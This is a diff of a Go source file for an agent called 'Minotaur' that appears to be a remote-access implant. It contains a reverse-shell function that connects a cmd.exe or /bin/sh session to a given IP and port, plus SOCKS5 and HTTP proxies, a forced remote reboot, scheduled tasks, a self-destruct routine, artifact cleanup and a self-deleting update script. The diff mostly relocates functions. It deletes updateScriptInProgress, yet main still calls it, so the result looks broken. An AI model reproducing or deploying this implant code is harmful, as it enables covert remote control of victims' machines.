@@ -21,9 +21,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"syscall"
 	"time"
-	"unsafe"
 )
 
 type Config struct {
@@ -96,64 +94,6 @@ func logf(format string, args ...interface{}) {
 			fmt.Fprintf(f, "[MINOTAUR] "+format+"\n", args...)
 		}
 	}
-}
-
-func acquireSingletonLock() (func(), bool) {
-	if runtime.GOOS == "windows" {
-		return acquireLockWindows()
-	}
-	return acquireLockUnix()
-}
-
-func acquireLockWindows() (func(), bool) {
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	createMutex := kernel32.NewProc("CreateMutexW")
-	getLastError := kernel32.NewProc("GetLastError")
-
-	mutexName, _ := syscall.UTF16PtrFromString("Global\\MinotaurAgentLock")
-	handle, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
-	if handle == 0 {
-		return nil, false
-	}
-	errCode, _, _ := getLastError.Call()
-	if errCode == 183 {
-		syscall.CloseHandle(syscall.Handle(handle))
-		return nil, false
-	}
-	release := func() {
-		syscall.CloseHandle(syscall.Handle(handle))
-	}
-	return release, true
-}
-
-func acquireLockUnix() (func(), bool) {
-	addr := &net.UnixAddr{Name: "\x00minotaur_agent_lock", Net: "unix"}
-	ln, err := net.ListenUnix("unix", addr)
-	if err != nil {
-		return nil, false
-	}
-	release := func() {
-		ln.Close()
-	}
-	return release, true
-}
-
-func updateScriptInProgress() bool {
-	exePath, err := os.Executable()
-	if err != nil {
-		return false
-	}
-	dir := filepath.Dir(exePath)
-	if runtime.GOOS == "windows" {
-		if _, err := os.Stat(filepath.Join(dir, "minotaur_update.bat")); err == nil {
-			return true
-		}
-	} else {
-		if _, err := os.Stat(filepath.Join(dir, "minotaur_update.sh")); err == nil {
-			return true
-		}
-	}
-	return false
 }
 
 func getHostname() string {
@@ -511,31 +451,6 @@ func startProxy(port string) {
 	logf("HTTP proxy on port %s stopped", port)
 }
 
-func transfer(destination io.WriteCloser, source io.ReadCloser) {
-	defer destination.Close()
-	defer source.Close()
-	io.Copy(destination, source)
-}
-
-func spawnReverseShell(ip, port string) {
-	conn, err := net.Dial("tcp", ip+":"+port)
-	if err != nil {
-		logf("Reverse shell connection failed: %v", err)
-		return
-	}
-	defer conn.Close()
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd.exe")
-	} else {
-		cmd = exec.Command("/bin/sh")
-	}
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Run()
-}
-
 func startSocks5(port string) {
 	addr := "0.0.0.0:" + port
 	ctx, cancel := context.WithCancel(context.Background())
@@ -639,43 +554,29 @@ func doProxyStop(port string) string {
 	return "Stopped proxy on port " + port
 }
 
-func doRestart(delay, message string) string {
-	if runtime.GOOS == "windows" {
-		if delay == "" {
-			delay = "0"
-		}
-		cmd := exec.Command("shutdown", "/r", "/f", "/t", delay)
-		if message != "" {
-			cmd.Args = append(cmd.Args, "/c", message)
-		}
-		if err := cmd.Run(); err != nil {
-			return fmt.Sprintf("Restart failed: %v", err)
-		}
-		return fmt.Sprintf("System restart scheduled in %s seconds", delay)
-	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
-		if delay == "" {
-			delay = "0"
-		}
-		var cmd *exec.Cmd
-		if runtime.GOOS == "darwin" {
-			cmd = exec.Command("shutdown", "-r", "now")
-		} else {
-			if delay == "0" {
-				cmd = exec.Command("shutdown", "-r", "now")
-			} else {
-				cmd = exec.Command("shutdown", "-r", "+"+delay)
-			}
-		}
-		if err := cmd.Run(); err != nil {
-			return fmt.Sprintf("Restart failed: %v", err)
-		}
-		if delay == "0" {
-			return "System restart initiated"
-		}
-		return fmt.Sprintf("System restart scheduled in %s minutes", delay)
-	} else {
-		return "Unsupported OS"
+func transfer(destination io.WriteCloser, source io.ReadCloser) {
+	defer destination.Close()
+	defer source.Close()
+	io.Copy(destination, source)
+}
+
+func spawnReverseShell(ip, port string) {
+	conn, err := net.Dial("tcp", ip+":"+port)
+	if err != nil {
+		logf("Reverse shell connection failed: %v", err)
+		return
 	}
+	defer conn.Close()
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe")
+	} else {
+		cmd = exec.Command("/bin/sh")
+	}
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
 }
 
 func doSchedule(action, name, schedule, command string) string {
@@ -899,14 +800,7 @@ rm -f "$0"
 	}
 
 	var scriptCmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		scriptCmd = exec.Command("cmd", "/c", scriptPath)
-	} else {
-		scriptCmd = exec.Command("/bin/sh", scriptPath)
-	}
-	scriptCmd.SysProcAttr = &syscall.SysProcAttr{
-		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
-	}
+	scriptCmd = exec.Command("/bin/sh", scriptPath)
 	if err := scriptCmd.Start(); err != nil {
 		return fmt.Errorf("failed to start update script: %w", err)
 	}
@@ -942,6 +836,45 @@ func selfDestruct() {
 		exec.Command("/bin/sh", scriptPath).Start()
 	}
 	os.Exit(0)
+}
+
+func doRestart(delay, message string) string {
+	if runtime.GOOS == "windows" {
+		if delay == "" {
+			delay = "0"
+		}
+		cmd := exec.Command("shutdown", "/r", "/f", "/t", delay)
+		if message != "" {
+			cmd.Args = append(cmd.Args, "/c", message)
+		}
+		if err := cmd.Run(); err != nil {
+			return fmt.Sprintf("Restart failed: %v", err)
+		}
+		return fmt.Sprintf("System restart scheduled in %s seconds", delay)
+	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		if delay == "" {
+			delay = "0"
+		}
+		var cmd *exec.Cmd
+		if runtime.GOOS == "darwin" {
+			cmd = exec.Command("shutdown", "-r", "now")
+		} else {
+			if delay == "0" {
+				cmd = exec.Command("shutdown", "-r", "now")
+			} else {
+				cmd = exec.Command("shutdown", "-r", "+"+delay)
+			}
+		}
+		if err := cmd.Run(); err != nil {
+			return fmt.Sprintf("Restart failed: %v", err)
+		}
+		if delay == "0" {
+			return "System restart initiated"
+		}
+		return fmt.Sprintf("System restart scheduled in %s minutes", delay)
+	} else {
+		return "Unsupported OS"
+	}
 }
 
 func processCommand(cmd Command) {
@@ -1061,6 +994,7 @@ func cleanupAllArtifacts() {
 	}
 }
 
+// ==================== MAIN ====================
 func main() {
 	if updateScriptInProgress() {
 		os.Exit(0)
